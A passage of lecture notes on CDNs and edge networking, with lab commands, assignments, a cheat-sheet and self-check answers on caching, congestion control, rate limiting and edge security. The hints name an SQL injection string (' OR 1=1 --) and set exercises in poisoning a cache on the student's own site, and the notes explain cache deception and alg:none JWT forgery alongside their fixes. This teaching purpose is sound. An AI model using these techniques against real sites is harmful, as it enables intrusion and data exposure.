    a = math.sin(dp/2)**2 + math.cos(p1)*math.cos(p2)*math.sin(dl/2)**2
    return 2 * R * math.asin(math.sqrt(a))

FIBRE_KM_PER_MS = 299_792 / 1.468 / 1000   # ≈ 204 km per ms
def rtt_floor_ms(km): return 2 * km / FIBRE_KM_PER_MS

mumbai, chennai, ashburn = (19.08, 72.88), (13.08, 80.27), (39.04, -77.49)
for name, dst in [("Chennai", chennai), ("Ashburn", ashburn)]:
    km = great_circle_km(*mumbai, *dst)
    print(f"Mumbai→{name}: {km:,.0f} km, RTT floor {rtt_floor_ms(km):.0f} ms")
```
Expected: roughly ~10 ms for Chennai and ~126 ms for Ashburn — matching the slide. Then `ping` a server in each place and compare.

### 9.6 Put your laptop behind the edge (Quick Tunnel)
```bash
# terminal 1 — any tiny server that prints request headers
python3 -c '
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        for k in ("CF-Connecting-IP","CF-Ray","CDN-Loop"): print(k, "=", self.headers.get(k))
        self.send_response(200); self.end_headers(); self.wfile.write(b"hello from my laptop\n")
HTTPServer(("127.0.0.1", 8000), H).serve_forever()'

# terminal 2
brew install cloudflared          # macOS
cloudflared tunnel --url http://localhost:8000
# → prints https://<random-words>.trycloudflare.com
```
Open that URL from your phone. Terminal 1 shows the visitor's real IP in `CF-Connecting-IP` and the colo in the `CF-Ray` suffix. (The lecture's `tools/echo_server.py` does this plus counting TCP connections — run `lsof -iTCP -sTCP:ESTABLISHED | grep cloudflared` 🧠 to see how few connections serve many visitors.)

### 9.7 See cache states move (needs a site you control behind Cloudflare, or any CDN site)
```bash
for i in 1 2 3; do curl -sI https://<your-site>/static/app.css | grep -iE 'cf-cache-status|age'; done
```
Expected: `MISS` then `HIT` with `age` climbing. For an HTML page: `DYNAMIC` until you add a Cache Rule.

### 9.8 The lab (if you have the `cdn-lab` repo)
```bash
./setup.sh && ./run_all.sh            # ~80 s, all 7 benches + 6 demos, no network
# then edit flags on edge/edge.py: --pool 0, --waf off, --strip-unkeyed
```

### 9.9 Real BBR vs CUBIC on Linux (Homework 2) 🧠
```bash
# add 75 ms each way (150 ms RTT) and 1% loss on the interface
sudo tc qdisc add dev eth0 root netem delay 75ms loss 1%
sysctl net.ipv4.tcp_available_congestion_control
sudo sysctl -w net.ipv4.tcp_congestion_control=cubic
curl -o /dev/null -w '%{speed_download}\n' http://<server>/bigfile
sudo sysctl -w net.ipv4.tcp_congestion_control=bbr
curl -o /dev/null -w '%{speed_download}\n' http://<server>/bigfile
sudo tc qdisc del dev eth0 root       # clean up!
```
Note: congestion control is chosen by the **sender** — set it on the machine *serving* the file (or put netem on the server and set its CCA). Expect BBR to be dramatically faster at 1% loss.

---

## 10 · Assignments and homework

### 10.1 Lesson 6 assignment — "Put something real behind the edge, and prove what it did"

**Task (restated):** Build a small origin in any language. Serve **one cacheable static asset** and **one personalised HTML page**. Put it behind Cloudflare (a free zone, or a Quick Tunnel — no account, no domain needed). Then make the edge prove itself **with numbers, not screenshots**.

| part | what to show |
|---|---|
| **Cache** | `cf-cache-status` going **MISS→HIT** for the asset, and **DYNAMIC** for the page. Then make the page cacheable and show the difference in **origin request count** (log it at the origin). |
| **The key** | Demonstrate **one cache-key hazard** on your own site — a header your origin reflects but the key ignores — then close it. Write up why it worked. |
| **Measure** | Report TTFB from far away (a cloud box in another region, or a friend) for **cold origin vs warm edge vs cache HIT**. One table, like `bench/02`. |
| **One edge feature** | Add exactly one: a WAF rule, a rate limit, or a Worker that verifies a token. Show a request it **blocks** and one it **allows**. |

**Deliverable:** the code, plus a one-page write-up with the numbers and the cache-key story. **Due before Session 7.**

**Approach / hints:**
1. **Origin:** a tiny Python `http.server` or Flask-free socket server with a request counter that logs every hit (`print(time, path, headers)`). Routes: `/static/app.css` (send `Cache-Control: public, max-age=3600`) and `/page` (reads a cookie or query param, says "Hi, <name>").
2. **Quick Tunnel caveat:** 🧠 quick tunnels go through Cloudflare's edge, but you can't add Cache Rules or WAF rules to a `trycloudflare.com` hostname you don't own. For the "make the page cacheable" and "one edge feature" parts, either use a free zone with your own domain, or use a **Worker** (free, `workers.dev` subdomain) in front of your tunnel URL — a Worker can use the Cache API and verify tokens.
3. **Making HTML cacheable:** Cache Rule ("Eligible for cache" on `/page*`) + send `Cache-Control: s-maxage=60` from the origin. Count origin hits before/after with a loop of 50 `curl`s.
4. **Cache-key hazard:** reflect a header like `X-Forwarded-Host` or a custom `X-Theme` into the HTML. Show one request with the header poisons the cached page for a request without it. Close it by: stripping the header (Transform Rule), adding it to the cache key (Cache Rule → custom key), or sending `Vary`. Explain *why* (unkeyed input → shared state).
5. **TTFB table:** use `curl -w '%{time_starttransfer}'` from a far-away VM. Rows: direct to origin (new conn), via edge on MISS, via edge on HIT. Run each ~10 times and report median.
6. **Edge feature:** easiest is a rate-limit rule on `/api/*` → show `200`s then `429`. Or a Worker that returns `401` without a valid HS256 JWT.

### 10.2 Homework (5 items)

1. **Run the whole lab and read `edge/edge.py`.** `./setup.sh && ./run_all.sh`, then read the edge end to end. Change one flag (`--pool 0`, `--waf off`, `--strip-unkeyed`) and explain the number that moves.
   - *Hint:* `--pool 0` → reuse → 0%, TTFB jumps by ~2 origin RTTs. `--waf off` → the plain `' OR 1=1 --` lands. `--strip-unkeyed` → poisoning demo stops working.
2. **Redo BBR vs CUBIC for real.** `laggy.py` only delays. On a real Linux box, use `tc netem` to add **1% loss at 150 ms RTT**, download a large file under `cubic` and under `bbr` (`sysctl`), and report the gap. "This is the number bench/05 refused to fake." *(See §9.9. Use the Mathis formula to predict CUBIC's ceiling first: 1460 B / (0.15 s × √0.01) ≈ 97 KB/s ≈ 0.8 Mbps.)*
3. **Poison your own cache, then fix it three ways.** Reproduce `demos/poison.sh` against a site you control. Close it three ways — **drop the header, add it to the key, Vary on it** — and argue which a real CDN should default to, and why.
   - *Hint to think about:* adding to the key / Vary fragment the cache (lower hit rate, and attacker can fill the cache with variants); dropping is safest when the origin doesn't truly need the header. Also, some CDNs only partially honour `Vary`.
4. **Find a real `cf-cache-status` in the wild.** `curl -I` ten sites you use. For each, explain its cache status, its `Cache-Control`, and what its cache key must be. **Find one HIT you think is a mistake.**
5. **The one to do if you do only one: measure the speed of light to your users.** Pick your origin's real region. For 5 cities your users are in, compute the RTT floor (`bench/01`) and measure the real ping. Where is the gap biggest — and would a CDN close it? *("It makes the physics personal." See §9.5.)*
   - *Hint:* the gap = (measured − floor) is routing detours + queues. A CDN closes the *distance* part for cache HITs and the *handshake* part for misses; it cannot shrink the origin leg for dynamic content.

### 10.3 Early HTTP/1.1 assignment (shown on the slides) — "Build a calculator that stays on the line"

**Due before Session 7.** Any language, no framework, just a socket.

```
 GET /add?a=2&b=3     → 200   5
 GET /sub?a=10&b=4    → 200   6
 GET /mul?a=6&b=7     → 200   42
 GET /div?a=9&b=3     → 200   3
 GET /div?a=1&b=0     → 400            (divide by zero)
 GET /add?a=x&b=3     → 400            (not a number)
 GET /pow?a=2&b=8     → 404            (unknown op)
 POST /add            → 405            (method not allowed)
 GET /add (no Host)   → 400            (HTTP/1.1 requires Host)
```
**How it's marked — one socket, every request:**
```python
s = socket.create_connection(("localhost", 8080))
# sends all six requests on the SAME socket …
# socket still open: True
# 1 TCP handshake, 6 responses
```
"If the socket dies before I am done, you have written a 1996 server." *Don't read `02-http11/server11.py` until you have failed at least once.*

**The part that is actually hard:** keeping the connection open forces a question HTTP/1.0 never asked: **where does this request end and the next one begin?** While you were hanging up, the answer was "at EOF", for free. Now you must consume **exactly `Content-Length` bytes and not one more — byte n+1 belongs to somebody else.**

**Stretch (optional):** honour `Connection: close` · an idle timeout you can defend · chunked encoding · take all six at once and answer in order (**pipelining**).

**Hints:**
- Keep a per-connection **buffer**. Loop: find `\r\n\r\n` in the buffer → that's the end of headers → parse → if `Content-Length: n`, wait until n more bytes are in the buffer → handle → **remove exactly those bytes** from the buffer → repeat (there may already be the next request sitting there — that's pipelining for free).
- Always send `Content-Length` in *your* responses, or the client can't tell where your response ends either.
- Check `Host` before routing; check method before parsing numbers (so `POST /add` → 405, not 400).

### 10.4 Course project (shown on the slides) — "HTTP, in binary · two tracks, one protocol"

**"Now you write the spec."** In pairs: one writes the server, one the client, and **the only thing that crosses between you is the spec**. *"A client that only works against your own server is an implementation, not a protocol."*

| Track 1 — the server: `./bserve ./www 9000` | Track 2 — the client: `./bcurl -v localhost:9000/index.html` |
|---|---|
| accept a TCP connection | build the binary request frame |
| read one binary request frame | read the response, body to stdout |
| map the path to a file under a root | `-v` hexdumps every frame |
| reply: status, headers, the bytes | exit non-zero on 4xx / 5xx |
| 404 if it is not there; 400 if the frame is malformed | and never open a second connection |
| and keep the connection open | |

**The bit in the middle is the actual project:**
- A **fixed-size frame header** — you pick the fields and widths, and defend them. **HTTP/2 chose 24 / 8 / 8 / 31. Why?** (🧠 24-bit length, 8-bit type, 8-bit flags, 1 reserved bit + 31-bit stream id = 9 bytes. 24 bits caps a frame at 16 MB, enough while keeping headers small; 8-bit type leaves room for 256 frame types; 31-bit stream ids give billions of streams per connection.)
- **Headers:** number the ten names you actually send, length-prefix the rest — **HPACK**'s first two mechanisms (🧠 static table + literal with length), in an evening.
- **One line you may not skip:** a receiver meeting a frame type it does not know **MUST skip it cleanly**. That is how you leave room for a version 2. (🧠 Same TLV forward-compatibility idea from Lesson 1 — the length tells you how far to jump.)

**What you hand in:** (1) The spec — two pages, enough for a stranger. (2) Your program. (3) An annotated hexdump of one complete request and response. *"If you cannot annotate your own bytes, the spec is not finished."*

---

## 11 · Cheat-sheet

### Key terms

| term | one-line meaning |
|---|---|
| **CDN** | Content Delivery Network — rented reverse proxies + caches in hundreds of cities |
| **Origin** | your real server; the source of truth |
| **Edge / PoP / colo** | a CDN location near users; Cloudflare names colos by IATA airport code |
| **Anycast** | one IP announced via BGP from many places; routing picks the "nearest" |
| **BGP** | Border Gateway Protocol — how networks announce which IPs they can reach |
| **RTT** | round-trip time; handshakes cost whole RTTs |
| **TTFB** | time to first byte of the response |
| **Fibre speed** | ~204,218 km/s ≈ 4.90 ms per 1000 km one way |
| **Mathis formula** | TCP throughput ≈ MSS / (RTT × √loss) |
| **Split TCP** | terminate TCP/TLS at the edge, reuse warm connection to origin |
| **Consistent hashing** | assign URLs to caches so adding a server moves only ~1/N of keys (Karger 1997) |
| **Virtual points** | hash each server many times (nginx: 160) to balance load |
| **Cache key** | what the cache looks things up by; default scheme+host+path+query |
| **Default cacheable** | 68 static extensions; NOT HTML/JSON/Set-Cookie/private/no-store |
| **Default edge TTL** | 200/301 → 2 h · 404 → 3 min · others not cached |
| **cf-cache-status** | MISS · HIT · EXPIRED · REVALIDATED · UPDATING · STALE · DYNAMIC · BYPASS |
| **cf-ray** | request id; suffix = colo that served it |
| **s-maxage** | TTL for shared caches only |
| **Vary** | "add this request header to the cache key" |
| **SSI** | Server-Side Includes (1994): origin fills holes in HTML |
| **ESI** | Edge-Side Includes (Akamai+Oracle, 2001): edge fills holes; −98% origin bytes, more origin requests |
| **Ajax** | browser fetches the personal holes with JS (~2005) |
| **Railgun** | Cloudflare delta compression origin↔edge (2013–Jan 2024) |
| **RFC 9842** | Compression Dictionary Transport (2025): `Available-Dictionary`, `dcb`/`dcz` |
| **Cache poisoning** | unkeyed header reflected into cached page → served to everyone (Kettle 2018) |
| **Cache deception** | private page cached because URL ends in `.css` (Gil 2017) |
| **CUBIC** | loss-based CCA; saw-tooth; mistakes distance-loss for congestion |
| **BBR** | Bottleneck Bandwidth and RTprop (Google 2016); paces to measured bandwidth; sender-only |
| **Connection pooling** | reuse warm origin connections; shared pool ≫ per-worker pools |
| **Pingora** | Cloudflare's Rust proxy (2022); 87.1% → 99.92% reuse |
| **Origin shield / tiered cache** | regional parent cache; N edges → 1 origin fetch |
| **Request collapsing** | one PoP sends one origin fetch for concurrent misses (`proxy_cache_lock`) |
| **WAF** | pattern-matching firewall; normalisation arms race; real fix = bind parameters |
| **Fixed window** | cheap rate limit; allows 2× burst at window boundary |
| **Sliding-window estimate** | prev × overlap + current; Cloudflare's choice, 0.003% error |
| **Token / leaky bucket** | burst-then-rate / constant drip (needs `burst` for browsers) |
| **Per-colo counting** | rate limits are per data-center: 330 cities = 330 budgets |
| **DDoS** | record 31.4 Tbps (Dec 2025); absorbed by anycast across ~500 Tbps capacity |
| **API gateway** | auth/scrub/route at edge — only real if origin is unreachable directly |
| **alg:none** | JWT forgery; never let the token choose its algorithm |
| **Authenticated origin pulls / Tunnel** | mTLS or outbound-only tunnel so only the edge can reach origin |
| **Workers** | edge code in V8 isolates; ~5 ms start, ~3 MB vs ~35 MB container |
| **Orange / grey cloud** | proxied through Cloudflare / DNS only |
| **Domain fronting** | hiding traffic behind another domain on the same CDN; now banned |
| **Fastly outage** | 8 Jun 2021, 85% of network erroring, 49 min |

### Numbers worth remembering

```
 4.90 ms / 1000 km one way in fibre      126 ms  Mumbai↔Virginia floor
 3 RTT  TCP+TLS1.3+HTTP cold             2 RTT   QUIC cold        (TLS 1.2: 4)
 194→0 ms  what a cache HIT deletes      621 → 233 ms  warm pool for a new user
 90.9% vs ~8%  keys moved: modulo vs consistent hashing
 98%  ESI origin-byte cut (but 100 → 201 requests)
 24 KB → 436 B  zstd with 1-min-old dictionary (~10× past gzip)
 98.7% reuse with one shared pool; Pingora 87.1% → 99.92%
 31.4 Tbps  record DDoS · ~500 Tbps Cloudflare capacity · 330+ cities
```

### The four ideas
```
 1. Move the work, or move the data.
 2. The edge is wherever all the traffic converges.
 3. It's all Sessions 2–5, rented by the city.
 4. Concentration cuts both ways.
```

---

## 12 · Self-check questions

**1. Why can't a faster server reduce the 126 ms Mumbai ↔ Virginia round trip?**
<details><summary>Answer</summary>

That 126 ms is propagation delay: light in fibre covering the distance (~4.9 ms per 1000 km one way). Server speed only affects processing time. The only ways to reduce it are a shorter path (move closer, i.e. an edge or cache) or a faster medium (hollow-core fibre, ~47% faster, not deployed on typical paths yet).
</details>

**2. A new HTTPS connection over TCP + TLS 1.3 takes how many RTTs to first byte? What about QUIC, and TLS 1.2?**
<details><summary>Answer</summary>

TCP + TLS 1.3 + HTTP: 3 RTT (TCP handshake, TLS handshake, request/response). QUIC + HTTP/3: 2 RTT, because the transport and crypto handshakes are merged into one (RFC 9001). TCP + TLS 1.2: 4 RTT.
</details>

**3. In the split-TCP bench, "edge with no origin pool" gave 625 ms, worse than direct (621 ms). Why, and what fixes it?**
<details><summary>Answer</summary>

Without a pool the edge opens a brand-new TCP+TLS connection to the origin for each request. So you pay 3 short RTTs to the edge plus 3 long RTTs to the origin, which is just a longer proxy. A warm origin pool removes the long handshakes, giving 233 ms for a new user. Only a cache HIT removes the 194 ms origin leg completely (34 ms / 11 ms).
</details>

**4. Using the Mathis formula, explain why the 6,000-mile path is 110x slower in throughput even though it's only 60x longer in RTT.**
<details><summary>Answer</summary>

Throughput ≈ MSS / (RTT × √loss). RTT grew 60× (1.6 → 96 ms) and loss also grew (0.6% → 1.4%), adding a factor of √(1.4/0.6) ≈ 1.5. Together that's roughly 60 × 1.5 ≈ 90–110×. Distance costs you twice: once in latency, once in loss.
</details>

**5. You have 10 cache servers using `hash(url) % N` and add an 11th. What happens, and why is consistent hashing better? What are virtual points for?**
<details><summary>Answer</summary>

About 90.9% of URLs map to a different server, which is effectively a cache flush followed by an origin stampede, right when you needed more capacity. With consistent hashing, servers and URLs sit on a ring and each URL goes to the next server clockwise. Adding a server only takes over its own arc, so about 1/11 of keys move. With 1 point per server the arcs are uneven (the busiest server gets 2.93× the mean load). With 160 virtual points per server the load evens out to 1.14×.
</details>

**6. By default, why does Cloudflare report DYNAMIC for your HTML page? What's the difference between DYNAMIC and MISS?**
<details><summary>Answer</summary>

By default Cloudflare only caches 68 static file extensions. HTML and JSON aren't on that list, and neither is anything with Set-Cookie or private/no-store/no-cache/max-age=0. HTML is often personalised, and the default cache key (scheme+host+path+query) ignores cookies, so caching it could serve one user's page to another. DYNAMIC means "not eligible, never looked in the cache", so every request goes to the origin. MISS means "eligible but not in the cache yet", so the next request should be a HIT.
</details>

**7. ESI cut origin bytes by 98%, but origin requests went from 100 to 201. Explain both numbers, and say when ESI is the wrong choice.**
<details><summary>Answer</summary>

The shared shell is fetched once and cached (1 MISS, 99 HITs), so the origin no longer renders and sends 100 full pages. But each user's page needs two personal fragments (user and cart) fetched separately: 1 + 100 + 100 = 201 requests. Bytes to the user don't change. ESI is the wrong choice when the origin's bottleneck is per-request overhead (connections, auth checks, DB lookups per fragment) rather than full-page rendering and bandwidth.
</details>

**8. Explain cache poisoning vs cache deception. What's the shared root cause?**
<details><summary>Answer</summary>

Poisoning (Kettle 2018): the attacker sends a header that isn't part of the cache key (e.g. X-Forwarded-Host), the origin reflects it into the page, and the poisoned page is cached and served to everyone. Fix it by dropping the header, keying on it, or Vary.

Deception (Gil 2017): the attacker tricks a logged-in victim into requesting /account/settings/fake.css. The origin returns the private page, and the edge caches it because of the ".css" extension. The attacker then fetches the same URL. Fix it by not caching on extension alone and honouring the origin's Content-Type and no-store.

The shared root cause is that the cache key disagrees with reality about what makes responses differ.
</details>

**9. Why is BBR easy for a CDN to deploy, and why does it beat CUBIC on long CDN paths?**
<details><summary>Answer</summary>

Congestion control is a sender-only decision: no new protocol, no client change, no router change. A CDN owns the sender on both the edge→user and edge→origin legs, so it can just switch BBR on. CUBIC is loss-based. It treats every loss as congestion and cuts its rate (the saw-tooth), so on long paths with random loss it mistakes distance for congestion. BBR measures bottleneck bandwidth and minimum RTT and paces to that, without treating loss as the congestion signal. Google saw 2–25× throughput, and CloudFront saw up to +22%.
</details>

**10. Why did one shared connection pool get 98.7% reuse while 32 per-worker pools got only 45.3%?**
<details><summary>Answer</summary>

A pooled connection can only be reused by the worker that opened it. When traffic is split across 32 workers, each worker sees too few requests to reuse its connections before the origin's 1-second idle timeout closes them, so most requests open new 2-RTT TLS connections. One shared pool concentrates all requests onto a few connections that stay warm. Cloudflare's move from per-worker nginx pools to Pingora's shared pool took reuse from 87.1% to 99.92%, a 160× drop in new connections.
</details>

**11. "100 requests per 10 seconds": why is a fixed window weak, why is a leaky bucket with burst=0 bad for browsers, and what does Cloudflare use?**
<details><summary>Answer</summary>

A fixed window resets its counter at each boundary, so 100 requests at 9.999 s plus 100 at 10.001 s lets 200 through almost instantly. A leaky bucket with no burst allowance refuses a normal page load that opens about 30 parallel requests (97% refused). That's why nginx's limit_req has a burst parameter. Cloudflare uses the sliding-window estimate, prev_count × overlap_fraction + current_count, which needs two counters per client and had a 0.003% error rate across 400M requests. Counts are also per colo, so a botnet spread across 330 cities gets 330 budgets.
</details>

**12. Your edge verifies JWTs and sets `X-User` for the origin. List three ways this can still go wrong and the fix for each.**
<details><summary>Answer</summary>

(1) The attacker hits the origin IP directly and bypasses the edge. Fix: authenticated origin pulls (mTLS) or a Tunnel, so the origin only accepts the edge. (2) The client sends its own X-User: admin. Fix: the edge always overwrites (or strips) identity headers with what it derived from the token. (3) An alg:none forged token is accepted. Fix: the server pins the algorithm (e.g. HS256 only) and never lets the token pick. Also check expiry (exp), and strip leaky headers like X-Powered-By.
</details>

**13. Why can a CDN absorb a 31.4 Tbps DDoS when your origin can't? What's the downside of everyone relying on that?**
<details><summary>Answer</summary>

A volumetric flood is beaten with more capacity than the attacker has, spread out geographically. Anycast sends each bot's traffic to its nearest PoP, so the flood is split across 330+ cities and about 500 Tbps of total capacity, and mitigation is automatic. Your origin has one pipe. The downside is concentration: the same shared network is a single point of failure. A Fastly config bug on 8 June 2021 sent 85% of its network to errors and took Reddit, Spotify and gov.uk down for 49 minutes.
</details>

**14. Why is a Cloudflare Worker faster to start than a container, and how does it fit the "amortise the setup" theme?**
<details><summary>Answer</summary>

A Worker runs in a V8 isolate inside a runtime that is already running in every PoP. Starting one takes about 5 ms and about 3 MB, because no process fork, VM boot or container image load is needed (a container is about 35 MB plus a cold start). This continues CGI (fork per request) → FastCGI (warm processes) → nginx (event loop) → isolates: each step pays the setup cost once and reuses it across many requests.
</details>

---

## 13 · Next week: Building for failures

> *"You just put a stranger in the middle of every request, and pooled your fate with everyone else on it. Now: what happens when it breaks?"*

Threads this lecture leaves hanging:
- **`stale-if-error`** — today a footnote (the `STALE` status); next week the cache is the last thing standing when the origin dies.
- **The Fastly 49 minutes**, and the retry / timeout / circuit-breaker logic that decides who notices an outage and who doesn't.
- **Failover** (`demos/failover.sh`: primary → backup, we watched it) · feature flags · graceful degradation · the **thundering herd on recovery**.

**The question to sit with:** today's edge survives your origin dying (a stale HIT). *What does your origin do when the edge, or a whole region, is the thing that dies?*
